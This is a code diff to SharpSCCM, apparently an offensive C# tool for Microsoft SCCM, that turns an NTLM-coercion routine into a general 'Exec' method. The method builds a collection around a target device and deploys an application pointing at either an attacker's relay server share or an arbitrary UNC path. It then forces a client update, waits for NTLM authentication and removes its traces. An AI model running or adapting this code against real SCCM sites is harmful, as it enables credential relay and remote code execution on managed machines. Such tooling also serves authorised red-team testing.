@@ -137,37 +137,48 @@ namespace SharpSCCM
                 }
             }
         }
-        public static void InvokeClientAuth (ManagementScope scope, string deviceName = null, string collectionName = null, string relayServer = null, bool runAsUser = true)
+        public static void Exec (ManagementScope scope, string deviceName = null, string collectionName = null, string path = null, string relayServer = null, bool runAsUser = true)
         {
             if ((String.IsNullOrEmpty(deviceName) && String.IsNullOrEmpty(collectionName)) || (!String.IsNullOrEmpty(deviceName) && !String.IsNullOrEmpty(collectionName)))
             {
                 Console.WriteLine("[!] You must specify either a device or existing collection.");
             }
+            else if (!String.IsNullOrEmpty(relayServer) && !String.IsNullOrEmpty(path) || (String.IsNullOrEmpty(relayServer) && String.IsNullOrEmpty(path)))
+            {
+                Console.WriteLine("[!] Please specify either a path or a relay server, but not both.");
+            }
             else
             {
                 if (!String.IsNullOrEmpty(deviceName))
                 {
-                        string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
-                        string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
-                        NewCollection(scope, "device", newCollectionName);
-                        AddDeviceToCollection(scope, deviceName, newCollectionName);
+                    string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
+                    string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
+                    NewCollection(scope, "device", newCollectionName);
+                    AddDeviceToCollection(scope, deviceName, newCollectionName);
+                    if (!String.IsNullOrEmpty(relayServer))
+                    {
                         NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
-                        NewDeployment(scope, newApplicationName, newCollectionName);
-                        Console.WriteLine("[+] Waiting 30s for new deployment to become available");
-                        System.Threading.Thread.Sleep(30000);
-                        InvokeUpdate(scope, newCollectionName);
-                        Console.WriteLine("[+] Waiting 1m for NTLM authentication");
-                        System.Threading.Thread.Sleep(60000);
-                        Console.WriteLine("[+] Cleaning up");
-                        Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
-                        Cleanup.RemoveApplication(scope, newApplicationName);
-                        Cleanup.RemoveCollection(scope, newCollectionName);
-                        Console.WriteLine("[+] Done!");
+                    }
+                    else
+                    {
+                        NewApplication(scope, newApplicationName, $"\\\\{path}", runAsUser, true);
+                    }
+                    NewDeployment(scope, newApplicationName, newCollectionName);
+                    Console.WriteLine("[+] Waiting 30s for new deployment to become available");
+                    System.Threading.Thread.Sleep(30000);
+                    InvokeUpdate(scope, newCollectionName);
+                    Console.WriteLine("[+] Waiting 1m for NTLM authentication");
+                    System.Threading.Thread.Sleep(60000);
+                    Console.WriteLine("[+] Cleaning up");
+                    Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
+                    Cleanup.RemoveApplication(scope, newApplicationName);
+                    Cleanup.RemoveCollection(scope, newCollectionName);
+                    Console.WriteLine("[+] Done!");
                 }
                 else
                 // If a collection is specified instead of a device
                 {
-
+                    Console.WriteLine("[!] Deploying an application to a collection has not yet been implemented. Try deploying to a single system instead.");
                 }
             }
         }
